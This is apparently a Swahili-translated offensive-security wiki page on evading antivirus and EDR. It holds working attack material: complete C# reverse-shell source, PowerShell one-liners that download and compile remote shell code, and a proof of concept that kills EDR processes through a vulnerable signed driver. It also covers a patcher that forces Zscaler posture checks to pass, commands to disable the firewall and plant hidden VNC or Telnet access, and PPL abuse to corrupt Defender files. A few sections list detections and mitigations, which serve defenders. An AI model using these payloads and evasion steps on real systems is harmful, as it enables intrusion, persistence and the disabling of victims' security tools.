- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa open-source fork ya [LLVM](http://www.llvm.org/) compilation suite inayoweza kuboresha usalama wa programu kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuzalisha, wakati wa kucompile, obfuscated code bila kutumia zana za nje na bila kubadilisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Ongeza tabaka la obfuscated operations zinazozalishwa na C++ template metaprogramming framework ambazo zitafanya maisha ya mtu anayetaka crack application kuwa ngumu kidogo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza obfuscate aina mbalimbali za pe files zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni metamorphic code engine rahisi kwa arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa LLVM-supported languages ikitumia ROP (return-oriented programming). ROPfuscator inaobfuscate program katika level ya assembly code kwa kubadilisha regular instructions kuwa ROP chains, ikizuia ufahamu wetu wa kawaida wa normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter imeandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode kisha kuzizindua

## SmartScreen & MoTW

Huenda umewahi kuona skrini hii unaponapakua baadhi ya executables kutoka internet na kuzitekeleza.

Microsoft Defender SmartScreen ni mekanisimu ya usalama iliyokusudiwa kumlinda mtumiaji wa mwisho dhidi ya kuendesha potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen inafanya kazi kwa mtazamo unaotegemea sifa (reputation-based approach), ikimaanisha kwamba applications ambazo hazipakuliwi mara kwa mara zitasababisha SmartScreen kutoa tahadhari na kuzizuia mtumiaji kuendesha faili (hata hivyo faili bado inaweza kuendeshwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina Zone.Identifier ambayo huundwa moja kwa moja wakati wa kupakua faili kutoka internet, pamoja na URL ambayo faili ilipakuliwa kutoka.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kukagua Zone.Identifier ADS kwa faili iliyopakuliwa kutoka internet.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizotiwa saini kwa **trusted signing certificate** **hazitachochea SmartScreen**.

Njia yenye ufanisi mkubwa ya kuzuia payload zako kutoka kupata Mark of The Web ni kuzibandika ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye **volumu zisizo za NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayobandika payloads ndani ya output containers ili kuepuka Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is a powerful logging mechanism in Windows that allows applications and system components to **rejestri matukio**. Hata hivyo, pia inaweza kutumiwa na bidhaa za usalama kufuatilia na kugundua shughuli hatarishi.

Kama ilivyowezekana ku-disable (ku-bypass) AMSI, pia inawezekana kufanya kazi ya **`EtwEventWrite`** ya mchakato wa user space irudie mara moja bila kuandika matukio yoyote. Hii inafanywa kwa kupachika (patch) function hiyo kwenye memory ili irudi mara moja, kwa hivyo kuzuia logging ya ETW kwa mchakato huo.

Unaweza kupata habari zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory imekuwa ikijulikana kwa muda sasa na bado ni njia nzuri ya kuendesha post-exploitation tools zako bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutaweza kuwa na wasiwasi mdogo kuhusu kupachika AMSI kwa ajili ya mchakato mzima.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) tayari zinatoa uwezo wa kuendesha C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inahusisha **kuanzisha mchakato mpya wa kutolewa** (sacrificial process), kuingiza post-exploitation malicious code yako kwenye mchakato huo mpya, kutekeleza code yako hatarishi na mwisho ukimaliza, kuua mchakato huo. Hii ina faida na hasara zake. Faida ya njia ya fork and run ni kwamba utekelezaji hufanyika **nja** ya Beacon implant process yetu. Hii inamaanisha kwamba ikiwa kitu katika kitendo chetu cha post-exploitation kitakwenda sio sawa au kimekamatwa, kuna **uwezekano mkubwa zaidi** wa **implant kuishi.** Hasara ni kwamba una **uwezekano mkubwa zaidi** wa kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Inahusu kuingiza post-exploitation malicious code **ndani ya mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kukisiwa na AV, lakini hasara ni kwamba kama kitu kitakwenda vibaya na utekelezaji wa payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza Beacon** kwani inaweza kusababisha crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa ungependa kusoma zaidi kuhusu C# Assembly loading, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyoelezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza code hatarishi kwa kutumia lugha nyingine kwa kumruhusu mashine iliyodukuliwa kupata mazingira ya interpreter yaliyowekwa **kwenye Attacker Controlled SMB share**.

Kwa kuruhusu upatikanaji wa Interpreter Binaries na mazingira kwenye SMB share unaweza **kutekeleza code yoyote katika lugha hizi ndani ya memory** ya mashine iliyodukuliwa.

Repo inaeleza: Defender bado inaskana scripts lakini kwa kutumia Go, Java, PHP n.k. tunapata **upeo zaidi wa kubypass signatures za static**. Majaribio na reverse shell scripts zisizofichwa katika lugha hizi yameonyesha mafanikio.

## TokenStomping

Token stomping ni technique inayomruhusu mshambuliaji **kucheza na access token au bidhaa ya usalama kama EDR au AV**, ikiwezesha kuipunguza privileges zake ili mchakato usife lakini usiwe na ruhusa za kukagua shughuli hatarishi.

Kuzuia hili Windows inaweza **kuzuia mchakato wa nje** kupata handles juu ya tokens za mchakato za usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kusanifu Chrome Remote Desktop kwenye PC ya mshambuliwa kisha kuitumia kuibeba na kudumisha persistence:
1. Download kutoka https://remotedesktop.google.com/, click on "Set up via SSH", kisha bonyeza faili ya MSI kwa Windows kupakua MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na bonyeza next. Wizard basi itakuuliza uidhinishe; bonyeza Authorize button kuendelea.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Kumbuka param ya pin ambayo inaruhusu kuweka pin bila kutumia GUI).


## Advanced Evasion

Evasion ni mada ngumu sana, wakati mwingine lazima uzingatie vyanzo vingi vya telemetry katika mfumo mmoja, hivyo ni karibu haiwezekani kubaki bila kugunduliwa kabisa katika mazingira yenye ukuaji.

Kila mazingira utakayokabiliana nayo yatakuwa na nguvu na udhaifu wake mwenyewe.

Ninakuhimiza uende uangalie mazungumzo haya kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata msingi wa mbinu za Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

hii pia ni mazungumzo mazuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo ita **ondoa sehemu za binary** mpaka ita **gundua ni sehemu gani Defender** anakiona kama hatarishi na ikigawanye kwako.\
Chombo kingine kinachofanya kitu sawa ni [**avred**](https://github.com/dobin/avred) yenye huduma wazi mtandaoni katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo ungeweza kusanisha (kama administrator) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fanya **ianze** wakati mfumo unapowashwa na **endeshe** sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha telnet port** (kificho) na zima firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka downloads za bin, si setup)

**ON THE HOST**: Endesha _**winvnc.exe**_ na sanidi seva:

- Washa chaguo _Disable TrayIcon_
- Weka nenosiri katika _VNC Password_
- Weka nenosiri katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili **mpya** iliyotengenezwa _**UltraVNC.ini**_ ndani ya **victim**

#### **Reverse connection**

The **attacker** anapaswa kutekeleza kwenye **host** yake binary `vncviewer.exe -listen 5900` ili iwe tayari kukamata reverse **VNC connection**. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kubaki fiche usifanye mambo machache

- Usianze `winvnc` ikiwa tayari inaendeshwa au utasababisha a [popup](https://i.imgur.com/1SROTTl.png). Angalia ikiwa inaendeshwa kwa `tasklist | findstr winvnc`
- Usianze `winvnc` bila `UltraVNC.ini` katika directory ile ile au itasababisha [the config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usifanye `winvnc -h` kwa msaada au utasababisha a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **start the lister** kwa `msfconsole -r file.rc` kisha **endesha** **xml payload** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Defender wa sasa atasitisha mchakato haraka sana.**

### Kujenga reverse shell yetu mwenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Revershell ya kwanza ya C#

Ikompile kwa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia nayo:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kwa kutumia compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Kupakua na kutekeleza kiotomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya obfuscator za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kujenga injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 ilitumia utility ndogo ya console inayojulikana kama **Antivirus Terminator** kuzima kinga za endpoint kabla ya kuweka ransomware. Zana hiyo inaleta dereva yake mwenye udhaifu lakini *signed* na inalinyanyasa kutoa operesheni za kernel zenye vibali ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.

Mambo muhimu
1. **Dereva iliyosainiwa**: Faili iliyowekwa kwenye diski ni `ServiceMouse.sys`, lakini binary ni dereva iliyosainiwa kisheria `AToolsKrnl64.sys` kutoka Antiy Labs’ “System In-Depth Analysis Toolkit”. Kwa sababu dereva lina saini halali ya Microsoft, linapakiwa hata Driver-Signature-Enforcement (DSE) ikiwa imewezeshwa.
2. **Usanidi wa huduma**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza unasajili dereva kama **huduma ya kernel** na wa pili unaianzisha ili `\\.\ServiceMouse` ipatikane kutoka ngazi ya mtumiaji.
3. **IOCTLs zilizoonyeshwa na dereva**
| IOCTL code | Uwezo                              |
|-----------:|------------------------------------|
| `0x99000050` | Kuua mchakato wowote kwa PID (kutumika kuua huduma za Defender/EDR) |
| `0x990000D0` | Futa faili yoyote kwenye diski |
| `0x990001D0` | Ondoa dereva na ifute huduma |

Mfano mdogo wa C (proof-of-concept):
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Kwa nini inafanya kazi**: BYOVD inazidi kabisa ulinzi wa user-mode; msimbo unaotekelezwa kwenye kernel unaweza kufungua *protected* processes, kuwaua, au kuharibu vitu vya kernel bila kujali PPL/PP, ELAM au vipengele vingine vya kuimarisha.

Ugunduzi / Kupunguza hatari
•  Wezesha orodha ya vizuizi vya madereva wenye udhaifu ya Microsoft (`HVCI`, `Smart App Control`) ili Windows itatae kupakia `AToolsKrnl64.sys`.
•  Fuatilia uundaji wa huduma mpya za *kernel* na toa tahadhari wakati dereva inapakiwa kutoka kwa saraka inayoweza kuandikwa na kila mtu au haipo kwenye orodha ya kuruhusiwa.
•  Angalia user-mode handles kwa vitu vya kifaa vilivyobinafsishwa ikifuatiwa na simu za hatari za `DeviceIoControl`.

### Kuvuka Zscaler Client Connector Posture Checks kupitia On-Disk Binary Patching

Zscaler’s **Client Connector** inatekeleza sheria za device-posture kwa ndani na inategemea Windows RPC kuwasilisha matokeo kwa vipengele vingine. Mambo mawili ya muundo dhaifu hufanya kuvuka kabisa iwezekane:

1. Tathmini ya posture hufanyika **kabisa upande wa mteja** (boolean hutumwa kwa server).
2. Endpoints za RPC za ndani zinathibitisha tu kuwa executable inayounganisha ime **signed by Zscaler** (kwa kutumia `WinVerifyTrust`).

Kwa **kurekebisha binaries nne zilizosainiwa kwenye diski**, mbinu zote mbili zinaweza kushindwa:

| Binary | Mantiki iliyorekebishwa | Matokeo |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Inarudisha kila mara `1` hivyo kila ukaguzi unaonekana unakubalika |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ mchakato wowote (hata usiosainiwa) unaweza kuunganishwa na pipes za RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Imebadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Imekatizwa |

Sehemu fupi ya patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha faili za asili na kuzindua tena service stack:

* **All** posture checks display **green/compliant**.
* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* The compromised host gains unrestricted access to the internal network defined by the Zscaler policies.

Somo hili la kesi linaonyesha jinsi maamuzi ya kuaminiana upande wa client tu na ukaguzi rahisi wa saini yanaweza kushindikana kwa few byte patches.

## Kutumia vibaya Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) inatekeleza hierarchy ya signer/level ili processes zilizolindwa zenye hadhi sawa au ya juu ziweze tu kuingiliana. Kwa upande wa mashambulizi, ikiwa unaweza kuanzisha kihalali binary iliyo na PPL na kudhibiti hoja zake, unaweza kubadilisha utendaji usio hatari (e.g., logging) kuwa primitive ya kuandika iliyodhibitiwa, iliyosaidiwa na PPL, dhidi ya directories zilizo na ulinzi zinazotumiwa na AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Mfano wa matumizi:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Binary iliyosainiwa ya mfumo `C:\Windows\System32\ClipUp.exe` inajizalisha yenyewe na inakubali kiparameta cha kuandika faili ya log kwenye njia iliyotajwa na mtumaji.
- Inapoanzishwa kama mchakato wa PPL, uandishi wa faili hufanyika ukiwa na msaada wa PPL.
- ClipUp haiwezi kuchambua paths zinazoonyesha spaces; tumia 8.3 short paths kuielekeza kwenye maeneo ambayo kwa kawaida yanalindwa.

8.3 short path helpers
- Orodhesha short names: `dir /x` katika kila parent directory.
- Pata short path katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Anzisha PPL-capable LOLBIN (ClipUp) na `CREATE_PROTECTED_PROCESS` ukitumia launcher (mf., CreateProcessAsPPL).
2) Pita ClipUp log-path argument ili kulazimisha uundaji wa faili katika directory ya AV iliyolindwa (mf., Defender Platform). Tumia 8.3 short names inapobidi.
3) Ikiwa target binary kwa kawaida iko wazi/imefungwa na AV wakati wa kukimbia (mf., MsMpEng.exe), panga uandishi wakati wa boot kabla AV haijaanza kwa kusanidi auto-start service inayokimbia mapema kwa uhakika. Thibitisha mpangilio wa boot kwa Process Monitor (boot logging).
4) Baada ya reboot, uandishi unaoungwa mkono na PPL hutokea kabla AV haijafunga binaries zake, ukiharibu target file na kuzuia startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Huwezi kudhibiti yaliyomo ambayo ClipUp inaandika zaidi ya mahali yanapowekwa; mbinu hii inafaa kwa uharibifu badala ya uingizaji sahihi wa yaliyomo.
- Inahitaji local admin/SYSTEM ili kusanidi/kuzindua service na dirisha la kuanza upya.
- Muda ni muhimu: lengo haliwezi kuwa wazi; utekelezaji wakati wa boot unazuia file locks.

Detections
- Uundaji wa mchakato wa `ClipUp.exe` kwa vigezo visivyo vya kawaida, hasa ikiwa mzazi ni programu za kuanzisha zisizo za kawaida, karibu na boot.
- Services mpya zilizowekwa kuanza kiotomatiki binaries zenye kutiliwa shaka na kuanza mara kwa mara kabla ya Defender/AV. Chunguza uundaji/ubadilishaji wa service kabla ya kushindwa kwa kuanzisha Defender.
- Ufuatiliaji wa uadilifu wa faili kwenye Defender binaries/Platform directories; uundaji/ubadilishaji wa faili usiotarajiwa na michakato yenye protected-process flags.
- ETW/EDR telemetry: angalia michakato iliyoundwa na `CREATE_PROTECTED_PROCESS` na matumizi isiyo ya kawaida ya kiwango cha PPL na binaries zisizo za AV.

Mitigations
- WDAC/Code Integrity: zuia ni binaries zipi zilizofungwa kwa saini zinaweza kuendesha kama PPL na chini ya wazazi gani; zuia uitoaji wa ClipUp nje ya muktadha halali.
- Service hygiene: zuia uundaji/ubadilishaji wa services za kuanza kiotomatiki na fuatilia uendeshaji wa mfululizo wa kuanzisha.
- Hakikisha Defender tamper protection na early-launch protections zimeshakiwa; chunguza makosa ya kuanzisha yanayoonyesha uharibifu wa binary.
- Fikiria kuzima 8.3 short-name generation kwenye volumes zinazohifadhi zana za usalama ikiwa inafaa kwa mazingira yako (jaribu kwa kina).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

